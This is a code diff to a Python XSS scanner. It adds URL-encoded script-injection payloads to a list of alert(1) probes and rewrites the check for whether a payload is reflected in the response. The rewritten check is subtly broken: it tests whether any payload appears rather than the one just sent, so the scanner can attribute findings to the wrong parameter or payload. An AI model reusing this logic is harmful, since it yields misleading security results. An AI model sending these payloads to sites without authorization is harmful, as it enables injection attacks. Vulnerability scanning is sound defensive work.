@@ -1,7 +1,7 @@
 import requests
 
 def scan_xss(url, params):
-    # XSS payloads
+    # XSS payloads 
     payloads = [
         "<script>alert(1)</script>",
         "\"><script>alert(1)</script>",
@@ -11,7 +11,10 @@ def scan_xss(url, params):
         "<body onload='alert(1)'>",
         "<iframe src='javascript:alert(1)'></iframe>",
         "<marquee/onstart=alert(1)>",
-        "<input/onfocus=alert(1)>"
+        "<input/onfocus=alert(1)>",
+        "%3Cscript%3Ealert(1)%3C/script%3E",  
+        "%3Cimg%20src='x'%20onerror='alert(1)'%3E", 
+        "%3Csvg%20onload='alert(1)'%3E"  
     ]
     
     vulnerabilities = []
@@ -22,7 +25,7 @@ def scan_xss(url, params):
             
             try:
                 response = requests.get(url, params=test_params)
-                if payload in response.text:
+                if any(payload in response.text for payload in payloads):
                     vulnerabilities.append((param, payload))
             except requests.RequestException as reqexception:
                 print(f"Request failed: {reqexception}")
